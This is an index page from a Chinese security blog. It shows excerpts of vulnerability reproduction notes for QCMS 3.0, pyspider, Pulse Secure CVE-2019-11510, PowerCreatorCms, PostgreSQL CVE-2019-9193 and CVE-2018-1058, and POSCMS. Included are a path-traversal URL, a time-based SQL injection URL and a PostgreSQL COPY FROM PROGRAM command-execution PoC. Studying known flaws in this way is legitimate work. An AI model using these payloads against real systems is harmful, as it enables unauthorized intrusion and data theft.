<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/47/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-QCMS/QCMS 3.0 留言板xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/QCMS/QCMS%203.0%20%E7%95%99%E8%A8%80%E6%9D%BFxss/" class="article-date">
  <time datetime="2022-07-08T06:26:03.093Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="QCMS-3-0-留言板xss"><a href="#QCMS-3-0-留言板xss" class="headerlink" title="QCMS 3.0 留言板xss"></a>QCMS 3.0 留言板xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>QCMS 3.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/QCMS3.0%E7%95%99%E8%A8%80%E6%9D%BFxss/media/rId24.png"></p>
<p>按照如图所示构造payload</p>
<p><img src="/resource/QCMS3.0%E7%95%99%E8%A8%80%E6%9D%BFxss/media/rId25.png"></p>
<p>提交之后无需审核，直接先弹个窗。。</p>
<p><img src="/resource/QCMS3.0%E7%95%99%E8%A8%80%E6%9D%BFxss/media/rId26.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/QCMS/QCMS%203.0%20%E7%95%99%E8%A8%80%E6%9D%BFxss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/QCMS/QCMS%203.0%20%E7%95%99%E8%A8%80%E6%9D%BFxss/" data-id="cl5c2qv5900ffy8v15rw5axk5" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-QCMS/QCMS 3.0 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2022-07-08T06:26:03.090Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="QCMS-3-0-任意文件读取"><a href="#QCMS-3-0-任意文件读取" class="headerlink" title="QCMS 3.0 任意文件读取"></a>QCMS 3.0 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>QCMS 3.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>用seay扫了一下后发现的漏洞</p>
<p>漏洞在后台模板代码预览处，构造payload例如</p>
<pre><code>http://www.0-sec.org/backend/template/tempview/Li4vLi4vLi4vQ29udHJvbGxlci9hZG1pbi5waHA=.html
</code></pre>
<p>即可读取Controller文件下admin.php文件源码</p>
<p><img src="/resource/QCMS3.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId24.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qv5b00fhy8v1bkl1apfk" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-QCMS/QCMS 3.0 任意文件上传" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time datetime="2022-07-08T06:26:03.088Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="QCMS-3-0-任意文件上传"><a href="#QCMS-3-0-任意文件上传" class="headerlink" title="QCMS 3.0 任意文件上传"></a>QCMS 3.0 任意文件上传</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>QCMS 3.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/QCMS3.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId24.png"></p>
<p>漏洞产生点在系统设置上传logo处</p>
<p>构造一个test.php文件，内容为`，点击上传</p>
<p><img src="/resource/QCMS3.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId25.png"></p>
<p>可以看到，上传后给出了路径</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/QCMS/QCMS%203.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl5c2qv5800fey8v1f47d4akk" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-QCMS/QCMS 3.0 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/QCMS/QCMS%203.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.085Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="QCMS-3-0-sql注入漏洞"><a href="#QCMS-3-0-sql注入漏洞" class="headerlink" title="QCMS 3.0 sql注入漏洞"></a>QCMS 3.0 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>QCMS 3.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在后台下载管理处</p>
<p><img src="/resource/QCMS3.0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p>构造payload</p>
<pre><code>http://www.0-sec.org/backend/down.html?title=1&#39;;select if(ascii(substr((select database()), 1, 1))-113, 1, sleep(5));%23
</code></pre>
<p>这里直接附上简单脚本</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/QCMS/QCMS%203.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/QCMS/QCMS%203.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv5700fdy8v1brigbr5w" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Pyspider/pyspider未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
  <time datetime="2022-07-08T06:26:03.079Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="pyspider未授权访问"><a href="#pyspider未授权访问" class="headerlink" title="pyspider未授权访问"></a>pyspider未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>pyspider未授权访问</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/Pyspider-web">https://github.com/ianxtianxt/Pyspider-web</a></p>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2quyt00f7y8v13yavgyjk" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Pulse Secure/（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Pulse%20Secure/%EF%BC%88CVE-2019-11510%EF%BC%89Pulse%20Secure%20SSL%20VPN%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2022-07-08T06:26:03.060Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-11510）Pulse-Secure-SSL-VPN-任意文件读取"><a href="#（CVE-2019-11510）Pulse-Secure-SSL-VPN-任意文件读取" class="headerlink" title="（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取"></a>（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Pulse Secure Pulse Connect Secure（又名 PCS，前称 Juniper Junos<br>Pulse）是美国 Pulse Secure 公司的一套 SSL VPN 解决方案。爆发的<br>CVE-2019-11510<br>该漏洞是由于所引入的一项通过浏览器访问其他端口的新功能缺乏安全限制所导致的，任意攻击者都可在未经身份验证的情况下利用该漏洞，读取系统敏感文件，获取<br>session、明文密码等敏感信息，从而非法入侵并操控<br>VPN，从而进一步威胁企业内网服务。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Pulse Secure PCS 9.0RX</p>
<p>Pulse Secure PCS 8.3RX</p>
<p>Pulse Secure PCS 8.2RX</p>
<p>Pulse Secure PCS 8.1R15.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Pulse%20Secure/%EF%BC%88CVE-2019-11510%EF%BC%89Pulse%20Secure%20SSL%20VPN%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Pulse%20Secure/%EF%BC%88CVE-2019-11510%EF%BC%89Pulse%20Secure%20SSL%20VPN%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qv5a00fgy8v15vwge3o0" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-PowerCreatorCms/PowerCreatorCms任意上传" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time datetime="2022-07-08T06:26:02.995Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PowerCreatorCms任意上传"><a href="#PowerCreatorCms任意上传" class="headerlink" title="PowerCreatorCms任意上传"></a>PowerCreatorCms任意上传</h1><h2 id="编辑器任意文件上传"><a href="#编辑器任意文件上传" class="headerlink" title="编辑器任意文件上传"></a>编辑器任意文件上传</h2><p>根据描述，是编辑器的漏洞，查看源码发现该CMS采用了kindeditor编辑器，该编辑器存在任意文件上传漏洞</p>
<p><img src="/resource/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/media/20201104204822-05ba7d7a-1e9c-1.png" alt="20201104204822-05ba7d7a-1e9c-1"></p>
<p>因为这个是烂大街的东西，关于对<code>kindeditor</code>编辑器任意文件上传的分析文章网上一搜一大堆，因此这里就略了。另外经过复现发现，只能传<code>txt</code>和<code>html</code>，不能传<code>aspx</code>，很鸡肋。</p>
<p><img src="/resource/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/media/20201104205137-79d2316c-1e9c-1.png" alt="20201104205137-79d2316c-1e9c-1"></p>
<p><img src="/resource/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/media/20201104205140-7bf49d2c-1e9c-1.png" alt="20201104205140-7bf49d2c-1e9c-1"></p>
<h2 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h2><h3 id="UploadResourcePic-ashx"><a href="#UploadResourcePic-ashx" class="headerlink" title="UploadResourcePic.ashx"></a>UploadResourcePic.ashx</h3><p>根据发现的两个shell，很明显shell的命名不是通过kindeditor编辑器上传的，一定是通过其他的方法上传上去的，那么我们来分析一下漏洞到底在哪呢？查找具有上传功能的点，发现了upload目录里全是上传功能文件</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/" data-id="cl5c2qv2u00fcy8v1946mhrlt" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-PostgreSQL/（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PostgreSQL/%EF%BC%88CVE-2019-9193%EF%BC%89PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:02.912Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-9193）PostgreSQL-高权限命令执行漏洞"><a href="#（CVE-2019-9193）PostgreSQL-高权限命令执行漏洞" class="headerlink" title="（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞"></a>（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PostgreSQL<br>9.3至11.2版本中的导入导出数据命令<code>COPY TO/FROM PROGRAM</code>存在操作系统命令注入漏洞。攻击者可利用该漏洞获取数据库超级用户权限，从而执行任意系统命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PostgreSQL 9.3至11.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先连接到postgres中，并执行如下POC：</p>
<pre><code>DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM &#39;id&#39;;
SELECT * FROM cmd_exec;
</code></pre>
<p><img src="/resource/(CVE-2019-9193)PostgreSQL%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
<p><img src="/resource/(CVE-2019-9193)PostgreSQL%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/PostgreSQL/%EF%BC%88CVE-2019-9193%EF%BC%89PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PostgreSQL/%EF%BC%88CVE-2019-9193%EF%BC%89PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv0700f9y8v141x6776e" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-PostgreSQL/（CVE-2018-1058）PostgreSQL 提权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:02.909Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-1058）PostgreSQL-提权漏洞"><a href="#（CVE-2018-1058）PostgreSQL-提权漏洞" class="headerlink" title="（CVE-2018-1058）PostgreSQL 提权漏洞"></a>（CVE-2018-1058）PostgreSQL 提权漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PostgreSQL<br>是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PostgreSQL 9.3-10</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>在Postgres的commit记录中，有如下<a target="_blank" rel="noopener" href="https://github.com/postgres/postgres/commit/5770172cb0c9df9e6ce27c507b449557e5b45124">commit</a>:</p>
<pre><code>As special exceptions, the following client applications behave as documented
regardless of search_path settings and schema privileges: clusterdb
createdb createlang createuser dropdb droplang dropuser ecpg (not
programs it generates) initdb oid2name pg_archivecleanup pg_basebackup
pg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isready
pg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standby
pg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdb
vacuumlo.  Not included are core client programs that run user-specified
SQL commands, namely psql and pgbench.
</code></pre>
<p>上面的commit提到了两类的client<br>applications。下文的较为直观的利用方式一是针对第二类client<br>applications（比如psql），然后利用方式二是通过第一类client<br>applications来执行任意代码，相比较下更为隐蔽。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv0400f8y8v12ay6133q" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-POSCMS/POSCMS 任意sql语句执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:02.725Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="POSCMS-任意sql语句执行漏洞"><a href="#POSCMS-任意sql语句执行漏洞" class="headerlink" title="POSCMS 任意sql语句执行漏洞"></a>POSCMS 任意sql语句执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="任意API调用"><a href="#任意API调用" class="headerlink" title="任意API调用"></a>任意API调用</h3><p><strong>分析入口文件</strong></p>
<blockquote>
<p>index.php ---&gt;/diy/init.php<br>------&gt;/diy/system/core/CodeIgniter.php</p>
</blockquote>
<p>程序使用的CodeIgniter（CI）框架，直接去看CI框架。</p>
<pre><code>$RTR =&amp; load_class(&#39;Router&#39;, &#39;core&#39;, isset($routing) ? $routing : NULL);
</code></pre>
<p>初始化Router类，调用_set_routing()方法绑定路由。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quxn00f5y8v1fitkbksq" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/46/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/45/">45</a><a class="page-number" href="/page/46/">46</a><span class="page-number current">47</span><a class="page-number" href="/page/48/">48</a><a class="page-number" href="/page/49/">49</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/48/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>